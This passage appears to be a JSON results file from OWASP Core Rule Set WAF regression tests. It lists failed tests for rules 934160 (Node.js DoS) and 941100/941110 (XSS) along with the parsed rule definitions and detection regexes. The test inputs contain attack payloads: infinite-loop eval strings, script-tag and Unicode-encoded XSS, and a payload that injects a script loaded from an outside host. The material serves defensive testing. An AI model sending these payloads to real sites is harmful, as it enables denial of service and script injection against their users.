          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "replaceComments"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js DoS attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934160",
    "test_id" : 22,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934160.yaml",
    "description" : "while truthy with double negation",
    "cause" : "failed expect_id check: 934160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 22,
      "desc" : "while truthy with double negation",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?eval=while(!!\"\");",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS DoS signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " NodeJS runs in a single thread, so any evaluated payloads that block execution can cause an easy DoS."
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to block e.g. while(true)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "while[\\s\\x0b]*\\([\\s\\x0b\\(]*(?:!+(?:false|null|undefined|NaN|[\\+\\-]?0|\\\"{2}|'{2}|`{2})|(?:!!)*(?:(?:t(?:rue|his)|[\\+\\-]?(?:Infinity|[1-9][0-9]*)|new [A-Za-z][0-9A-Z_a-z]*|window|String|(?:Boolea|Functio)n|Object|Array)\\b|\\{[^\\}]*\\}|\\[[^\\]]*\\]|\\\"[^\\\"]+\\\"|'[^']+'|`[^`]+`)).*\\)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "replaceComments"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js DoS attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934160",
    "test_id" : 24,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934160.yaml",
    "description" : "while truthy with double negation",
    "cause" : "failed expect_id check: 934160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "while truthy with double negation",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?eval=while(!!``);",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS DoS signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " NodeJS runs in a single thread, so any evaluated payloads that block execution can cause an easy DoS."
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to block e.g. while(true)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "while[\\s\\x0b]*\\([\\s\\x0b\\(]*(?:!+(?:false|null|undefined|NaN|[\\+\\-]?0|\\\"{2}|'{2}|`{2})|(?:!!)*(?:(?:t(?:rue|his)|[\\+\\-]?(?:Infinity|[1-9][0-9]*)|new [A-Za-z][0-9A-Z_a-z]*|window|String|(?:Boolea|Functio)n|Object|Array)\\b|\\{[^\\}]*\\}|\\[[^\\]]*\\]|\\\"[^\\\"]+\\\"|'[^']+'|`[^`]+`)).*\\)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "replaceComments"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js DoS attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941100",
    "test_id" : 1,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941100.yaml",
    "description" : "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
    "cause" : "failed expect_id check: 941100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Libinjection - XSS Detection ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://github.com/client9/libinjection"
        }, {
          "type" : "Comment",
          "text" : " Ref: https://speakerdeck.com/ngalbreath/libinjection-from-sqli-to-xss"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Targets ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 941100: PL1 : REQUEST_COOKIES|"
        }, {
          "type" : "Comment",
          "text" : "               REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|"
        }, {
          "type" : "Comment",
          "text" : "               ARGS_NAMES|ARGS|XML:/*"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 941101: PL2 : REQUEST_FILENAME|REQUEST_HEADERS:Referer"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_xss",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: XSS data found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941110",
    "test_id" : 2,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941110.yaml",
    "description" : "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
    "cause" : "failed expect_id check: 941110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=<script+>alert(1);</script>",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 1 ]=-"
        }, {
          "type" : "Comment",
          "text" : " http://xssplayground.net23.net/xssfilter.html"
        }, {
          "type" : "Comment",
          "text" : " script tag based XSS vectors, e.g., <script> alert(1)</script>"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)<script[^>]*>[\\s\\S]*?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 1: Script Tag Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941110",
    "test_id" : 6,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941110.yaml",
    "description" : "XSS in payload using %uNNNN",
    "cause" : "failed expect_id check: 941110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920260 - Unicode Full/Half Width Abuse Attack Attempt", "phase=2 rule_id=920230 - Multiple URL Encoding Detected", "phase=2 rule_id=920240 - URL Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "XSS in payload using %uNNNN",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "uri" : "/get",
          "headers" : {
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/x-www-form-urlencoded"
          },
          "data" : "var=%uff1cscript%u0020%uff1ealert%281%29%uff1c/script%uff1e\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters - Category 1 ]=-"
        }, {
          "type" : "Comment",
          "text" : " http://xssplayground.net23.net/xssfilter.html"
        }, {
          "type" : "Comment",
          "text" : " script tag based XSS vectors, e.g., <script> alert(1)</script>"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)<script[^>]*>[\\s\\S]*?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 1: Script Tag Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941110",
    "test_id" : 7,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941110.yaml",
    "description" : "XSS in payload with individual code points urlencoded",
    "cause" : "failed expect_id check: 941110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941390 - Javascript method detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "XSS in payload with individual code points urlencoded",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "uri" : "/get",
          "headers" : {
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "User-Agent" : "OWASP CRS test agent",
